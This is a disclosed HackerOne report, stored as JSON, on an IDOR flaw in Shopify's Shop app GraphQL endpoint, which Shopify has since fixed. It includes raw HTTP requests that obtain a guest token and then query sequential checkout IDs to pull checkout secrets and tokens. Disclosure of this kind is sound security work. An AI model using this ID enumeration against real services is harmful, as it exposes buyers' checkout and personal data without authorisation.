{
  "id": 1064869,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY0ODY5",
  "url": "https://hackerone.com/reports/1064869",
  "title": "Informations disclosure - Access to some checkout informations",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-12-22T23:45:25.786Z",
  "submitted_at": "2020-12-22T23:45:25.797Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "imgnotfound",
    "url": "/imgnotfound",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/kfb97hnubizb8ot4cfd7ie8uhm7w/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-03-13T00:51:20.556Z",
  "bug_reporter_agreed_on_going_public_at": "2021-03-13T00:51:20.489Z",
  "team_member_agreed_on_going_public_at": "2021-03-11T18:22:25.208Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "It came to my attention that using the **CheckoutStatus** query on `https://arrive-server.shopifycloud.com/graphql` it is possible to access some checkout details, specifically the query can be called with an ID value ranging from `1` up to `48908`. \n\nUnfortunately, as I could not figure out how to create a new `CheckoutStatus` on my own, I won't be able to dig deeper. I've tried to create a new order on my own shops and when accessing the next ID (48909), it is still returning nothing. \n\nThat said, an explanation could either be that the **CheckoutStatus** query isn't used anymore thus only returning \"legacy\" orders or simply that the `id` property type has been changed from an Integer to an unpredictable one (i.e.: UUID).\n\n## Steps to reproduce\n\n.1. Make the following request\n\n```\nPOST /graphql HTTP/1.1\nHost: arrive-server.shopifycloud.com\nAccept: */*\nIf-None-Match: W/\"9753ba99576a2d7d3e7e0331a16c5b8e\"\nAccept-Language: en-ca\nContent-Type: application/json\nContent-Length: 230\nUser-Agent: Shop/2.15.4-release+377 ios/14.2\nConnection: close\n\n{\"operationName\":\"SignInAsGuest\",\"variables\":{},\"query\":\"mutation SignInAsGuest {\\n  signInAsGuest {\\n    authPayload {\\n      accessToken\\n      refreshToken\\n    }\\n    userErrors {\\n      field\\n      message\\n    }\\n  }\\n}\\n\"}\n```\n\n.2. From the returned payload, copy the `accessToken` value\n.3. Make the following request, by making sure to replace the {accessToken} placeholder with the previous step `accessToken` value\n\n```\nPOST /graphql HTTP/1.1\nHost: arrive-server.shopifycloud.com\nAccept: */*\nAuthorization: Bearer {accessToken}\nAccept-Encoding: gzip, deflate\nIf-None-Match: W/\"5ebae03d57dd7da47f078e11e3cfc0db\"\nAccept-Language: en-ca\nContent-Type: application/json\nContent-Length: 348\nUser-Agent: Shop/2.15.4-release+377 ios/14.2\nConnection: close\n\n{\"operationName\":\"CheckoutStatus\",\"variables\":{\"id\":\"48805\"  },\"query\":\"query CheckoutStatus($id: ID!) {\\n  checkoutStatus(id: $id) {\\n    ... on Checkout {\\n      id\\n      isShopPay\\n      payJsonParams\\n      status\\n      token\\n      url\\n      errorCode\\n    }\\n    ... on PollingInfo {\\n      waitMillis\\n      shouldRetry\\n    }\\n  }\\n}\\n\"}\n```\n\n**Response**\n```\n{\"data\":{\"checkoutStatus\":{\"id\":\"48805\",\"isShopPay\":true,\"payJsonParams\":\"{\\\"transaction_params\\\":\\\"checkout_secret=███\\\\u0026encrypted_params=███\\\\u0026locale=en\\\",\\\"token\\\":\\\"█████████\\\",\\\"origin\\\":\\\"shop_app\\\",\\\"shopify_domain\\\":\\\"sunday-citizen.myshopify.com\\\",\\\"checkout_token\\\":\\\"████████\\\"}\",\"status\":\"created\",\"token\":\"████████\",\"url\":\"https://shop.app/pay/session\",\"errorCode\":null}}}\n```\nBy looking at the returned response, specifically the `payJsonParams` property, it should then be possible to access the checkout page as the checkout secret and token are being returned. Therefore, we should get access to the buyer's email  and probably even more informations if the purchase has been completed.\n\n## Impact\n\nAccess to some checkout informations",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 143,
  "voters": [
    "eitans",
    "0xcyborg",
    "drsniper",
    "tmo_sh",
    "bombon",
    "alp",
    "battle_angel",
    "ertugrul",
    "badcracker",
    "mashoud1122",
    "and 133 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 37198,
    "asset_type": "OTHER",
    "asset_identifier": "Shopify Developed Apps",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 29816,
      "category": "team",
      "content": "On Dec 22nd, @francisbeaudoin reported an Insecure Direct Object Reference vulnerability on our Shop app. This issue could have allowed an attacker to iterate over checkout IDs created in the Shop app in order to obtain checkout details, including the shipping address. This only affected checkouts created within the Shop app for shops belonging to Shopify employees.\nWe have fixed the issue by checking whether the user accessing the checkouts is the owner of them.",
      "user": {
        "id": 677350,
        "username": "leanne_shapton",
        "name": "Leanne Shapton",
        "bio": null,
        "cleared": false,
        "verified": false,
        "website": null,
        "location": null,
        "created_at": "2019-07-15T16:01:27.042Z",
        "url": "https://hackerone.com/leanne_shapton",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
